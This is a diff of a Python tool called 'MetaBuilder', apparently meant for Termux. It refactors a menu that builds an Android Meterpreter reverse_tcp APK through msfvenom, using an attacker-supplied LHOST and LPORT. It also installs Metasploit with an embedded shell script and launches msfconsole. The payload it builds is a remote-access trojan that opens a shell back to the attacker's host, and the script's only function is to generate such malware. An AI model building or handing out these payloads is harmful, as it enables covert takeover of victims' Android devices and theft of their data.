@@ -1,13 +1,19 @@
 import os
 
-print("MetaBuilder by KiNGEX")
+def build_payload():
+    lhost = input("LHOST - ")
+    lport = input("LPORT - ")
+    IPORA = input("Payload Name -")
 
-install_metasploit = input("Do you want to install Metasploit? (Y/N): ").strip().lower()
+    msfvenom_command = f"msfvenom -p android/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} R > {IPORA}"
 
-if install_metasploit == 'y':
-    # Add the Metasploit installation commands here
+    print(msfvenom_command)
+
+    os.system(msfvenom_command)
+
+def install_metasploit():
     os.system('''
-   #!/data/data/com.termux/files/usr/bin/bash
+    #!/data/data/com.termux/files/usr/bin/bash
 chmod +x Meta.sh
 clear
 echo "
@@ -182,15 +188,35 @@ echo -e "\033[32m Installation complete. \n Launch metasploit by executing: msfc
 center "*"
 
     ''')
-else:
-    # Proceed with your original code
-    lhost = input("LHOST - ")
-    lport = input("LPORT - ")
-    IPORA = input("Apk Name -")
 
-    msfvenom_command = f"msfvenom -p android/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} R > {IPORA}"
+def launch_metasploit():
+    os.system("msfconsole")
 
-    print(msfvenom_command)
-
-    os.system(msfvenom_command)
-  
+while True:
+    print("███╗░░░███╗███████╗████████╗░█████╗░██╗███╗░░██╗░██████╗██████╗░██╗░░░██╗██╗░░░░░")
+    print("████╗░████║██╔════╝╚══██╔══╝██╔══██╗██║████╗░██║██╔════╝██╔══██╗██║░░░██║██║░░░░░")
+    print("██╔████╔██║█████╗░░░░░██║░░░███████║██║██╔██╗██║╚█████╗░██████╦╝██║░░░██║██║░░░░░")
+    print("██║╚██╔╝██║██╔══╝░░░░░██║░░░██╔══██║██║██║╚████║░╚═══██╗██╔══██╗██║░░░██║██║░░░░░")
+    print("██║░╚═╝░██║███████╗░░░██║░░░██║░░██║██║██║░╚███║██████╔╝██████╦╝╚██████╔╝███████╗")
+    print("╚═╝░░░░░╚═╝╚══════╝░░░╚═╝░░░╚═╝░░╚═╝╚═╝╚═╝░░╚══╝╚═════╝░╚═════╝░░╚═════╝░╚══════╝")
+    print(" By KiNGEX | github.com/KiNGEX1")
+    print("_________________________________")
+    print("Options:")
+    print("1. Build Payload")
+    print("2. Install Metasploit")
+    print("3. Launch Metasploit")
+    print("4. Exit")
+    
+    choice = input("Enter your choice: ").strip()
+    
+    if choice == '1':
+        build_payload()
+    elif choice == '2':
+        install_metasploit()
+    elif choice == '3':
+        launch_metasploit()
+    elif choice == '4':
+        break
+    else:
+        print("Invalid choice. Please select a valid option.")
+        
